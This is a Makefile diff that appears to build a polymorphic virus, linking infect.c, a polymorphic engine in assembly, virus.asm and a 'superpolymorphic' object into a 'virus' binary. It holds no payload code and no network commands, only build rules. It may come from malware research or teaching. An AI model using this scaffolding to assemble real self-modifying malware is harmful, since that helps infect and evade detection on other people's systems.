@@ -32,39 +32,52 @@
 # compile level development - with debuging symbols intact
 
 ASM = nasm
-
 GCC = g++
 CC = gcc
-
+LCC = ld
 AFLAGS = -felf64 -g -F dwarf 
 
-CFLAGS = -c  -Wall -O2 -g
+CFLAGS = -c -nostartfiles -Wall -O2 -g   -m64
 
 LFLAGS = -no-pie 
 KFLAGS = -no-pie -nostartfiles -m64 -g -falign-functions=16 
-all: virus hello
+CKFLAGS = -no-pie -nostartfiles  -m64 -g -falign-functions=16 
+MFLAGS = -no-pie -r -nostdlib
+MCFLAGS = -no-pie -r -nostdlib
+all: virus hello  polymorphic.o superpolymorphic.o
 
-virus: infect.c polymorphic.c  polymorphicengine.o  virus.o
-	$(CC) $(KFLAGS) $^ -o $@
+# C CODE
+virus: infect.c superpolymorphic.o
+	$(CC) $(KFLAGS) $^ -o $@	
+
+superpolymorphic.o: polymorphicengine.o polymorphicendgame.o virus.o
+	$(LCC) $(MFLAGS) $^ -o $@
+# C CODE
+
+# C++ CODE --NOT WORKING
+# virus: infect.cpp superpolymorphic.o
+# 	$(GCC) $(CKFLAGS) $^ -o $@
+
+# superpolymorphic.o: polymorphicengine.o virus.o polymorphicendgame_cpp.o
+# 	$(GCC) $(MFLAGS) $^ -o $@
+# C++ CODE
+
+
+polymorphicendgame_cpp.o: polymorphic.cpp
+	$(GCC) $(CFLAGS) $^ -o $@
+
+polymorphicendgame.o: polymorphic.c
+	$(CC) $(CFLAGS) $^ -o $@
+
+polymorphic.o: polymorphicengine.o virus.o
+	$(LCC) $(MFLAGS) $^ -o $@
 
 virus.o: virus.asm template.asm.inc
 	$(ASM) $(AFLAGS) $< -o $@
 
-polyengine.o: polymake.cpp
-	$(GCC) $(CFLAGS) $< -o $@
-
-
 polymorphicengine.o: polymorphicengine.asm
 	$(ASM) $(AFLAGS) $< -o $@
 
-
-hello: hello.c
-	$(CC) $(LFLAGS) $^ -o $@
-
-test: test.c test.o
-	$(CC) $(KFLAGS) $^ -o $@
-test.o: test.asm
-	$(ASM) $(AFLAGS) $< -o $@
 
 # # deploy level extreme deployment - this strips out all kind of information using the switch `-s` for gcc
 # # In this mode objdump will not work with labels supplied as the labels now chnaged to placeholder
